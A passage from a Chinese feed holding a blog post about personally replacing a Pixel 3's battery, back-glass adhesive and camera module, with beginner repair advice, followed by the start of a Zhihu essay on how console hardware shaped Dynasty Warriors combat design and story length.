不俗的拍照表现，这台 Pixel 3 却还有另一处问题：启动相机后，每当手机出现比较明显的移动，（后置）摄像头的画面就会有一个明显的波动，伴随着俗称「拉风箱」的反复重新对焦，仿佛 OIS 系统在主动摇晃镜头一样。</p>\n<p>如此极为影响拍照体验的问题经过几次排障和系统重置之后只能认定为硬件问题，正好可以趁这次机会把相机模组也一并更换掉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/0191d2518dc65197794bc27cb8b73012.jpg\"></figure><p>关于 Pixel——或者其他任何手机——的内部结构，网上都可以找到详实的资料，包括但不限于  iFixit、JerryRigEverything、XYZone  的「享拆」栏目等等。在给 Pixel 3 开膛的过程中，我主要参考了 Hugh Jeffreys 的《<a href=\"https://www.youtube.com/watch?v=KqGxcNjakLo&amp;t=4s\" target=\"_blank\">Two Google Pixel 3's For $17 - Lets Restore Them</a>》。</p>\n<p>自从安卓手机纷纷自2017年前后重拾对于玻璃的热忱之后，拆卸手机后盖又变成了一件麻烦的事情。Pixel 3的后盖虽然延续了谷歌标志性的双色风格，但是仍然属于同一块玻璃，不同的后盖颜色仅仅是玻璃背面的一层喷漆。虽然无论是专业的热风枪还是一般的吹风机都可以达到软化背胶的效果，但是人在广州吹风机却在佛山的我不得不另辟蹊径，从热水壶里面找到了解决办法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/8d6e32f2700776401068d78ace56b5e9.jpg\"><figcaption>新 煮 机 网</figcaption></figure><p>虽然有着热水和电池把后盖撑开的缝隙的帮助，Pixel 3 后盖粘胶的粘度还是超出了我的预期。标称防水级别达到 IPX8 的 Pixel 3 后盖粘胶是很「宽」的一圈，单纯用三角撬片的效果并不好，最后发现用拆机片像锯木头那样前后把胶划开才是最有效的。</p>\n<p>类似 Pixel 使用背部指纹并且有防水等级的手机（e.g. Galaxy S10 以前的三星）往往会把指纹模组直接粘在后盖上，抬起的时候要像拆解 iPhone 5S 那样注意分离角度以免扯断指纹传感器的排线。不过市面上把生物传感器和手机绑定的公司除了苹果之外别无二家，所以即使不小心扯断了排线也可以很容易地买到备件，价格普遍都在 50 块钱以内。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/a1e3eb9fabbfc0159c80b896c8279d51.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/6fe32c111081c04a14b197ec4da98723.jpg\"><figcaption>无论拆开手机是为了做什么，第一步都应该是断电</figcaption></figure><p>然而 Pixel 3 的电池易拉胶设计的很糟糕。</p>\n<p>脱胎于3M可移除胶带的电池易拉胶通常指的是抽拉式易拉胶，这种胶带在分子结构上拥有软硬不同的段落，分别为胶带提供柔性和连续性。当水平抽扯易拉胶的时候，胶带的内聚力会让胶带表面和胶面错位从而失粘，帮助胶带近乎无痕地脱离。</p>\n<blockquote><p>电池周围的外框设计很重要，因为它会给接下来的移除产生很大影响。为了得到理想的抽拉结果，建议在电池和外框间保持≥1mm 的空间，并且尽可能低的外框高度。<a href=\"https://www.tesa.cn/news/bond-and-detach-design-guide.html#0\">来源</a></p></blockquote>\n<p>问题在于，谷歌并没有给电池易拉胶留出足够的水平空间，导致胶带要么无法竖向抽出、要么会因为倾斜着刮在中框金属上而直接扯断。苹果从 iPhone 5S 开始使用的抽拉式易拉胶，虽然没有在内部结构上直接留出空间，但是在拆卸掉 Taptic Engine 和主板之后可以无损地将电池抽出；谷歌则是反其道而行之，在 Pixel 3 上将电池易拉胶放在了无论怎么拆都会被中框挡住的左侧，也就导致了扯断易拉胶几乎是无可避免的事情，即使是经验丰富的 Hugh Jeffreys 最后也是手动把电池掰出来的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/d84eb4d4daaa584c8cbe9b2fb20ec86f.png\"></figure><p>由于我的旧电池除了报废之外毫无他用，因此可以没有顾虑地在扯断全部三条电池易拉胶之后直接用塑料撬棒把电池用蛮力卸下来，然后用酒精或者异丙醇清洁残余的胶痕。</p>\n<p>与电池相比，拆掉主板更换相机至少无需蛮力。假如经常看手机拆解的话，基本上所有人都会发现手机的后置摄像头通常是用 BTB 接口（board-to-board connector）连接在主板朝向手机背面的一侧的。然而思路清奇的 Google 就是不要，而是把相机的 BTB 压在了主板朝向屏幕的一侧，导致原本非常模块化的相机更换流程必须先把主板彻底拆下才能进行，堪称非常典型的多此一举。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/84eca2d644c3a68a702bb1d8bd751ee2.jpg\"><figcaption>连接在主板背面的相机模组</figcaption></figure><p>假如一切都按照计划进行的话，Pixel 3 只需要半个小时就可以拥有一块新的电池、一个新的相机模组和一套新的后盖胶。然而就在我兴高采烈地拧上无线充电模组、把手机翻过来准备测试一下新电池的时候，我发现它虽然可以正常开机，电量却始终维持在 1%，并且无论如何都无法检测到充电，以至于我以为在撬走旧电池的时候伤到了当时没有完全取出的主板。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/706b8387872cb4a3ff2ea6b3433b6a04.jpg\"></figure><p>万幸的是，经过大约二十分钟的拆拆装装，我惊喜的发现原来是我在装电池的时候没有把电池线压紧，重新组装一遍后所有功能都恢复了正常。<s>（小丑竟是我自己）</s></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/d3ebd5896a6dd26f37afda3d3bd3d234.jpg\"></figure><p>焕发新生的 Pixel 3 在一旁生龙活虎地充着电，我开始收拾桌子上散落的工具。在我看来，对于这些 N 手电子设备，修修补补也是使用体验中的一部分。</p>\n<p>之前关于这台 Pixel 3 的<a href=\"https://sspai.com/post/67754\" target=\"_blank\">文章</a>中，我对于使用体验的总结是 「有点苦，但是苦尽甘来的感觉比其他手机都要甜」，而现在就是艰苦过后最甜的时刻——换上新电池之后，我重新得到了一台在我的使用习惯下可以轻松撑过六个小时且动力澎湃（相对来说）的小钢炮——四舍五入，这种兴奋感比前几天全新到货的小米 11 Lite 的要强烈许多倍。</p>\n<h2>👀所有人都可以自己动手</h2>\n<p>诚然，手机作为日常生活中一般会接触到的<strong>集成度最高</strong>的电子产品，密密麻麻的螺丝、形状各异的盖板、联袂纵横排线甚至是严丝合缝的粘胶都会让人在尝试迈出第一步的时候遇到很大的心理阻力。「如果我不小心把屏幕拆坏了怎么办？」 「如果我把同轴线挑断了怎么办？」 「如果我把手机装回去发现多了一堆螺丝怎么办？」 「修好之后手机彻底不亮屏了怎么办？」 这些问题是每次拧下第一颗螺丝的时候我都会想到的，但是倘若坐在那里，这些问题也不会凭空化解。</p>\n<p>因此，从我的个人角度和积攒的经验出发，我会给想要尝试自己动手的各位以这些建议：</p>\n<h3>从旧机器开始</h3>\n<p>智能手机普及至今，几乎所有人的家里都可以翻找出一台或者几台因为各种原因而退役的机器——无论是电池老化、屏幕碎裂，甚至是泡了水。这样做的原因很简单：只要不是特别古早或者冷门的机型，它们的配件甚至整机的价格往往是非常便宜的。低廉的价格保证了即使因为初次动手而弄坏了零件，也可以很容易地找到备件并继续下去，从而避免「为了修好坏掉的手机而花了一部新手机的钱」这种极具挫败感的情况。当然，如果自己手中没有合适的老旧设备，向周边的人问问也是一个不错的方法——谁不想冒着一点小小的风险而获得一次免费的维修机会呢？</p>\n<h3>瓷器活的确是需要金刚钻的</h3>\n<p>尝试迈出第一步时的另一个误区往往是陷入了「反唯工具论」的假象中，比如我第一次尝试着拆开那台 iPhone 5 的屏幕时所想的——坚信自己不需要吸盘也可以把屏幕拆开的后果就是美工刀在屏幕支架上留下的刻痕。对于手机这一类体积小且集成度高的电子产品，一套相对具有针对性的工具是非常有必要的：它们的意义不仅仅在于更方便地拆装，更多的时候，趁手的工具才是避免因为使用蛮力而弄坏零件的主要屏障。</p>\n<p>我的工具箱里面包含了一套小米和 wiha 联名的螺丝刀，若干散装购买的塑料撬棒、镊子和三角撬片，以及一个压杆吸盘——去掉99块钱的米家螺丝刀之外，剩下的工具总价甚至不到20块钱。</p>\n<h3>善用互联网</h3>\n<p>手机修理并非极端冷门的话题，自己动手修、甚至是自己动手 DIY 改装都已经是非常普遍的现象，因此在动手之前花上五分钟搜索一下对应机型的拆解，就是避免在自己动手的过程中两眼一抹黑的最好方法。</p>\n<p>以我个人为例，我惯用的信息来源包括 iFixit 的 YouTube 频道和官网上的拆解指南，以及类似 Huge Jeffreys、JerryRigEverything、XYZone 等等各个平台上专门面向拆解的视频频道。对于少部分极其冷门的机型，或者非手机类的电子产品，基本上只需要通过查询「机器 + disassemble」或「机器 + restoration」，就可以准确地命中散落在互联网各处的、由个人作者制作和上传的视频或者文章。</p>\n<h3>明确自己在修什么</h3>\n<p>如同开头提到的那个混乱场景，手机修理是包含数个不同的种类的。需要焊台拆焊、植锡、替换受损电容等等的操作当然存在，但是其目的在于「让出问题的零件恢复功能」，所需要的技术水平和操作环境都有相当的要求；而我们可以亲自参与的，其实是对于零件的替换，即「让出问题的手机恢复功能」，在本质上与换灯泡并无二致。因此为了消弭心中对于「修手机是需要焊接技术」之类的成见，只需要多看几个视频，就会发现手机基本上只是多了点胶水的大号乐高而已。</p>\n<h2>最后</h2>\n<p>电子产品仍然是人设计的，自然也可以由人来修理。尽管的确有厂商刻意采取手段——咳咳咳...苹果...咳咳——以增加消费者自己拆解与维修的难度，但是有难度并不是我们不采取行动的理由。恰恰相反，这是一种对于自己购买的电子设备的所有权的强调方式。当然，出于专业性、可靠性与效率的考量，我仍然会在可以取得来自厂商的维修服务的时候推荐大家优先考虑第一方维修，但第一方维修远远不是我们唯一的选择：「亲自动手」正是我们得以保留「选择的权利」的原因。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/854efdb84fbee56e125307aaf73c3f55.jpg\"></figure><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68213"},{"title":"你认为《真三国无双》系列游戏未来系统革新的方向是什么？","date":"2021-08-27 03:04:46","description":"\n<p>分两个方面谈，先说动作。</p>\n<p>直接抛出论点，无双系列现在要考虑的不是如何让自己进化，而是怎么合理地完成退化。近些年许多成功的游戏都在向过去的类型回归，甚至是想方设法给自己套上枷锁，因为技术虽然可以不断提升，但开发人员的精力和玩家的注意力都是有限的，设计者需要把控好其中的平衡点。无双系列之所以变成现在这个样子，很大原因是设计者失去了节制。</p>\n<p>现在的无双被称为“割草”游戏，割草和无脑甚至成为了玩家口中的卖点，而老玩家又会告诉你最初的无双其实是相当硬核的游戏，打击感很强，敌人的攻击意识和招式性能都很高，玩起来并不简单。这些都是事实，但我最近又重新观察了一下无双的旧作和新作，发现无双系列过去的优秀打击感和高对抗性实际上都是缘于巧合，它们产生于PS2初期的低性能，而游戏机性能的进步反而毁掉了这种体验。</p>\n<p>如果我们追溯到FC时代，当时由于游戏机性能不足，同屏通常只会出现4个以内的敌人，外加游戏容量有限，必须以提升难度的方式来增加游玩时长。因而这个时期的敌人攻击欲望极高，性能强度也总是超过玩家所操控的角色，往往同屏出现两个以上的敌人就能给玩家带来很大压力。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ade0234f3fd44e0bd5866ac7fdbd4a51_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ade0234f3fd44e0bd5866ac7fdbd4a51\" data-watermark-src=\"v2-52971147598a74c12c5cfedad556260f\" data-private-watermark-src=\"v2-a811f4771c17a63922ee5a4e0ceb07ba\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5c224178025baa256cb7bbe21e5423d5_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"445\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-5c224178025baa256cb7bbe21e5423d5\" data-watermark-src=\"v2-c5bc835f54fef115a6de8ecd0dbeaa30\" data-private-watermark-src=\"v2-1018e665d9a770442d370fcd45a7adbc\"></p>\n<p>这一点在街机和PS1上的动作游戏里也没有太大变化，同屏基本只能支撑六个以内的计算单位，因而需要调高单个敌人的性能强度来维持难度。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-07bdc6f1f02468295b89f486c46bda55_720w.jpg?rss\" data-rawwidth=\"384\" data-rawheight=\"224\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-07bdc6f1f02468295b89f486c46bda55\" data-watermark-src=\"v2-2d5a99bf865a13b1c485c5e39a3e0ecb\" data-private-watermark-src=\"v2-4e7c05f00c9e2d7b8aaadace0eaffe9e\"></p>\n<p>但PS2上的初代真三国无双打破了这种传统，其整个战场是联通的，并没有分离区域并为同屏出现的敌人设置上限，理论上玩家可以将尽量多的敌人集中在同一地点。但事实上根本这不可能办到，因为机能达不到要求使得玩家视野只有十来步的距离，脱离开这个范围就是雾茫茫的一片，而且同屏人数一旦超过十几人就会因为运算速度跟不上而出现严重的拖慢现象，身边的敌人甚至会消失或者闪现。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bf016283dba544b485412c42c4fe39eb_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"319\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bf016283dba544b485412c42c4fe39eb\" data-watermark-src=\"v2-7dd1d47919e20a7ca90c330092ff4b2e\" data-private-watermark-src=\"v2-e13f7ad38b74f4c767ae0d595d4ac234\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1aa82141c448ae3ad7cd0a60d3bd2681_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1aa82141c448ae3ad7cd0a60d3bd2681\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这个问题直到2004年9月的战国无双猛将传里也没有得到完全解决，该作视野范围狭小和动作拖慢现象都比较明显，但等到2005年2月（记住这个时间点）的真三国无双4发售后，顽疾终于被克服。四代之所以能解决这些问题是因为使用了新的画面引擎，并且这时已经属于PS2后期，各大厂商都把游戏机性能吃透了，技术升级过后的354无论视野还是同屏人数都不能与353同日而语。</p>\n<p>但这样一来问题也就出现了，如果敌人保持与前作同样的强度，那么在同屏人数大幅增加后玩家要怎么应对呢？虽然老玩家们喜欢说二三代的AI高，四代的AI低，但经过一些技术大佬的解析，发现四代的AI程序要比三代要写得更加复杂且合理。例如三代的士兵出招是完全不分场合的，就是一股脑猛砍，玩家的弹返可以轻易成功，四代则分清了各种情况，当玩家招式挥空失误后敌人会积极出招。但四代的敌人攻击欲望确实要低很多，而且经过解析发现，制作组一开始写了高攻击欲望的程序，但最后并没有启用，有专门做mod的大神不辞辛苦把敌人的攻击欲望提上去后，发现游戏变成了这样：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fe1b3df5938feebb3ac538fb625fba26_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fe1b3df5938feebb3ac538fb625fba26\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>如此一来，也就很好理解为何制作组没有启用已经写好的程序了。</p>\n<p>为了应对同屏人数增加带来的难题，制作组选择了两种手段，一是降低士兵AI，二是提升招式性能。早先无双武将的招式性能配合玩家的操作要和十个以内的敌方单位进行交战是勉强可以办到的，而这个数字如果继续往上提，那就不是玩家的操作可以弥补的了。如果大家去看早期无双作品的高手视频，会发现再怎么厉害的人也免不了经常挨打，和鬼泣系列的大佬们可以轻易做到无伤炫技截然不同。而这并不是因为这些玩家技不如人，纯粹是因为敌人太多再外加无双武将的招式性能跟不上。</p>\n<p>所以四代只好调低了杂兵的攻击欲望和招式性能，杂兵不再有C技，没有全套的普通攻击，无法致晕和击飞玩家，并且出招频率也大幅下降。但武将AI其实并没有降低（相对353本传），甚至略有提升，如果去玩战国无双2浅井长政的金崎之战或者初代无双大蛇战国传的五丈原之战，打出多个己方武将围殴敌将的场景时，就会发生刚才的图片里一群人砍得对手根本翻不了身的状况。</p>\n<p>然而即便如此，这种调整给整个游戏带来的体验也是颠覆性的变化。玩家面对低欲望的敌人可以轻易地杀进杀出，在战场上宛如闲庭信步，也正是从这一代起，无双有了“割草”之名。而为了在高难度下保持对玩家的震慑力，制作组简单粗暴地提升了敌人数值并断掉玩家补给，修罗难度下敌人的伤害是困难难度下的五倍，玩家练满的角色都挨不起几刀。</p>\n<p>于是出现一种很奇葩的现象是老玩家一提起四代的敌人智商和招式性能都说好菜，但提起四代的修罗难度又说真尼玛难。三代猛将传的敌人攻击欲望和战斗对抗性虽然远在四代之上，但三代猛将传的达人难度其实比四代的修罗难度要简单许多，这是因为三代的数值平衡做得比四代好，而四代之所以把数值做崩是因为敌我攻防没做好，攻防没做好又是因为制作组削弱了杂兵，削弱杂兵的原因是同屏人数增加，而追溯到最后一切的根源居然是因为游戏机性能的提升。</p>\n<p>五代制作组因为四代受到的这些批评曾试图进行挽回，又再次调高了敌人的攻击欲望。结果因为五代出在PS3上，机器性能又再一次得到升级，同屏人数比四代还多得多，加上五代的数值做得和四代一样崩，即使无双武将的招式性能已经远超四代，并且没有断掉补给，但五代的修罗难度玩起来比四代还要难。因为人太多，玩家经常连自己是怎么死掉的都不知道，只能频繁地使用“三方一滚”，打个架如同买彩票。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0e292888ce5435ca6ca5809944f1634f_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-0e292888ce5435ca6ca5809944f1634f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>铃木亮浩接手六代时其实还想再挣扎一下，因而六代高难度下的杂兵其实很有威胁性，高伤害外加庞大的数量，一拥而上两管体力马上就没了，而且很难用操作技术来加以弥补。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7e8077a2b434f4f9aa06f49922cb861d_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7e8077a2b434f4f9aa06f49922cb861d\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-324076d558e3b1b19bbc01fe1793dc25_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-324076d558e3b1b19bbc01fe1793dc25\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>于是铃木后来也干脆放弃了，在猛将传里加了道吸血当保险，七八代又持续降低敌人的威胁性，让游戏彻底割草化。</p>\n<p>至于提升招式性能，无双系列发轫于格斗游戏和清版过关游戏，因而系列早期作品里己方武将的出招朴实无华，初代真三里甚至没有特效招式，同时敌方角色也有不错的性能。敌人从小兵到武将都能够使用完整的连招，早期的小兵甚至会放无双和拼刀，武将还可以自行恢复体力。</p>\n<p>不过这在很大程度上还是机能不足所带来的影响。早期PS2游戏并不足以支撑各种冰火特效，例如二代许多武将的C6都是发出剑气，到三代就变成了偃月形的刀光，特效效果明显要精致许多。此外武将的出招速度也偏慢，这是3D图形处理能力不足所导致的，同时期的初代鬼泣和初代鬼武者也是这种情况。即使到了04年3月发售的怪物猎人里主角的出招都极其缓慢，而且设计者故意将招式按键设计得十分别扭，目的就是为了降低玩家的出招频率（结果歪打正着成了系列特色）。</p>\n<p>也正因为如此，游戏里出现了武将性能不足的问题。当时每一作都会给武将提升招式性能，例如二代增加了两段普通攻击、两段蓄力攻击、真无双乱舞，三代强化了C1、C3，增加JC和报名技，四代强化C5、C6、JC，增加进化攻击和无双觉醒。但因为每一代里敌兵都会变得比前一作更多，而且这几代的招式框架并没有发生改变，所以整体上保持了动态平衡，除开降低敌人攻击欲望的四代之外，玩家并没有因为招式性能的提升而感到难度明显降低。而且如果让四代维持三代的敌人攻击频率，无双武将的招式性能反而会明显跟不上，尤其貂蝉张角等角色在高难度下几乎无法生存。</p>\n<p>而问题就出在这里，四代已经完全克服了先前几代的技术难题，无论招式特效还是攻击速度都可以轻易提上去，到后来的初代无双大蛇里制作组炫技般地令武器可以产生满屏特效再外加抽风般的攻击速度。于是四代经过强化后的C5全部是效果技，而且破天荒地引入了武器重量设计，可以靠轻武器提升出招速度，此后无双系列每一作里都有提升出招速度的属性，而潘多拉魔盒也就此打开。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-82377a3cade4aa0520842ae79d324e39_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-82377a3cade4aa0520842ae79d324e39\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>过强的招式性能破坏了攻防之间的平衡，四代开始几乎每个角色都有大范围效果技，并将其作为击杀敌人的法宝。于是无双系列的战斗就成了想方设法撑过平庸的普通技，尽力使出效果技之后轻松灭杀大片敌人，整个过程千篇一律。而过快的攻击速度使得设计者只好缩短敌人的受创硬直，配合混乱的特效，招式立回也难以呈现，因而打击感大打折扣。</p>\n<p>这几代的武将个个都有大范围攻击，有远程招式，能够用轻功取消出招，无双乱舞威力大增，还能觉醒放宝，敌人等同于待宰的羔羊。但这又是没有办法的办法，因为现在的无双系列想在一张屏幕里放下一百个角色都不是什么难事，一个无双扔下去就能轻松打出从前一整场战斗才能完成的击杀数。以一敌十尚能谈谈攻防平衡问题，以一敌百要如何谈呢？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c1e0e1463f03044cbfeee531c3c4aefd_720w.gif?rss\" data-rawwidth=\"480\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1e0e1463f03044cbfeee531c3c4aefd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>实际上也有人通过修改程序，尝试让敌人恢复前几代的攻击欲望，和修改四代程序后大不相同的是，因为现在的武将性能和武器属性过于强大，即使敌人保持当年的攻击频率，玩家还是可以通过自身强大到近乎无赖的招式轻松过关。</p>\n<p>如果我们把视野放得更宽，会发现机能的无限升级在某种程度上已经摧毁了整个传统动作游戏。差不多是在光荣吃透PS2机能的同一时间，2005年3月卡普空推出了鬼泣3，而性能是PS2两倍的Xbox则早先一步在2004年3月推出了忍者龙剑传。这些游戏的诞生有一个共同前提，那就是游戏机3D图像处理性能的提升，这使得开发者可以轻易地实现自己在动作方面的设想。</p>\n<p>这两个游戏有一些共同特点，例如激烈的攻防、流畅的出招、华丽的变招等到，这类游戏在2009年10月发售的猎天使魔女当中几乎达到集大成的水平，但也很快走到了末路。无限华丽的出招变招已经超出多数玩家所能承受的极限，而想要求快是没有止境的，FPS类游戏的职业玩家需要屏幕达到两百多帧才不容易出现失误，机能有多高就把游戏做多快只能通向死路。于是这些游戏很快就不吃香了，销量也跟着下跌。到后来同样是白金工作室做的尼尔：机械纪元里，已经没人强调游戏的动作系统做得有多出色了（虽然确实很出色），但它却比白金工作室出的其他任何一款游戏都卖得好。</p>\n<p>以魂类游戏为首，现在的动作游戏反而主张让游戏节奏慢下来，弱化游戏攻防，强化成长系统，用体力条限制玩家的行动，并取消不同难度的设定，让玩家通过熟悉机制和抓住弱点来战胜敌人。从前的动作游戏里所流行的高速激烈攻防遭遇版本更替，让位给了拥有最大公约数的新模式。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1b091b3372896c8d4d6723902d77047b_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1b091b3372896c8d4d6723902d77047b\" data-watermark-src=\"v2-215f6d8e012b5bc1d1de3cd03d35fe18\" data-private-watermark-src=\"v2-9b0f40ff29dfc36eb8d7a63e6f99b1f3\"></p>\n<p>曾有动画爱好者开玩笑说EVA之所以成为神作是因为钱没给够，要是钱给够了，庵野秀明做出来的就是新剧场版了。这句话可以同样套用在传统动作游戏上面，传统动作游戏当年之所以流行也是因为机能不够，要是机能够了，玩家也就玩不下去了。</p>\n<p>回到无双身上，虽然无双系列从诞生起喊出的口号就是“一骑当千”，然而最初的无双顶多是“一骑当十”，但这正是无双游戏好玩的根源。当初的无双拥有优秀的打击感和严谨的招式判定，制作组之所以会做出这样的好游戏恰恰是因为机能不够，这是一个美丽的巧合，因为制作组真正想做的是“一骑当千”的游戏，也就是现在的无双所呈现出的样子。而等到真正可以做出这样的游戏后，大家才发现，“一骑当千”并不好玩。</p>\n<p>要问怎么改的话，如果是两年前的我，肯定会不假思索地说减少同屏人数，降低招式性能，恢复到三代的合理水平。即使现在我也觉得这个想法没有问题，战国无双猛将传的同屏人数和招式性能就是我心中无双类游戏最合适的范围。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c2c2f01cb5f62b6e7761407d63bd02de_720w.jpg?rss\" data-rawwidth=\"564\" data-rawheight=\"422\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c2c2f01cb5f62b6e7761407d63bd02de\" data-watermark-src=\"v2-92c26c5e7f549fd2f7540b623b9de260\" data-private-watermark-src=\"v2-49f649c7e5fd1806c414db81b5ecc962\"></p>\n<p>问题是很多时候即使知道了正确的方向也无法找到正确的路线。类如强行把鬼泣和忍龙里招式性能降下来，加入其它机制，多半会让游戏死得更快，要做这样的改动不如另起炉灶直接搞一个新系列。而且无双系列这种特殊的过关游戏如果不在进行模式上做出重大调整，同屏人数不会有任何变化，那要怎么一边体现出战场感一边控制敌人数量呢？这个问题可能远比想象中要复杂。</p>\n<p>同时，无双大蛇3的销量又显示出这种无脑割草的风格依旧很有市场。同时这些年在玩家中也深受好评的几部无双（如战国BASARA3、P5S）也并没有在敌人AI上显示出多么高的水平，因此没必要直接把路堵死，像战国BASARA3和P5S的打击感甚至还不如无双。</p>\n<p>如果学习这几部作品就应该革新动作系统，无双系列的动作设计确实过于简单无聊，而且缺乏个性。比如八代的关兴和钟会都使用刀扇，这两人有什么共同特点，为什么要用同样的招式？就算使用独立模组的武将也很少有体现自身个性的出招方式，例如蔡文姬的箜篌就是简单地释放音波攻击，没有更多体现出箜篌特点的攻击，实际操作体验和普通武器并没有什么区别。</p>\n<p>但如果要在这方面进行革新，那么新的问题又产生了，战国BASARA在三代经历了脱胎换骨的变化之后，四代的进化方向也陷入了迷茫，和之前提到的鬼泣有了同样的烦恼，那就是系统设计过于复杂，许多角色操控起来的繁杂感已经超过爽快感。而在三代当中已经设计得十分优秀的角色招式又必须进行性能调整，其中不乏越调越差的。此外，现在的真三系列已经多达94名角色，谁有本事给这么多人全部设计出个性攻击来？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4d4dcf3a47e476787911f69bdf2872f5_720w.jpg?rss\" data-rawwidth=\"657\" data-rawheight=\"605\" data-size=\"normal\" data-caption=\"香蕉系列才四十多个人就陷入了发展瓶颈\" data-watermark=\"original\" data-original-src=\"v2-4d4dcf3a47e476787911f69bdf2872f5\" data-watermark-src=\"v2-f4d2871d922f867724f0ab7ba1cde9b8\" data-private-watermark-src=\"v2-85673c083fcf5d282641643cda77b88b\"></p>\n<p>与其说无双系列目前的动作系统缺少研究价值，不如说这样的系统正好适合无双。我们假设把每个角色都做出研究价值来，那么从上手到熟练，三个小时以上是必须的吧，三乘以九十四等于多少？四乘以九十四呢？</p>\n<p>而且就算精心打磨把游戏做得尽善尽美，下一作要如何在继承优点的基础上继续进化又是个难解决的问题。无双这种系统设计再外加系列化的做法，像是为自己定下一条死路。之所以只剩光荣一家还在做这种游戏，是因为只有他们肯一条路走到黑，其他公司早就发现这条路走不通了。</p>\n<p>第二个方面则是剧情和游戏模式。</p>\n<p>我写过很多评价无双系列剧情的文章，这里不想多说将来真三系列的剧本应该怎么写这种细节问题，就说时长。352的剧情CG仅有12分钟，过场事件也不多，353的剧情CG有18分钟，到354就猛增到五十多分钟，而且过场事件也大幅增加。355的全部剧情动画采用同一规格制作，约有194分钟，六代加猛将传仅高质量CG就有71分钟，配合剧情事件接近四个小时。七代CG虽少，但全部剧情动画有约六个小时，到八代干脆除开五个小时的剧情动画外，其余剧情衔接全部做成站桩对话，连夷陵之战都没有专门的动画。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-64b38ce2727fed88497d6ea6c655ecf6_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"418\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64b38ce2727fed88497d6ea6c655ecf6\" data-watermark-src=\"v2-cf89ba2e1a8df6598dc5138c6fe1b922\" 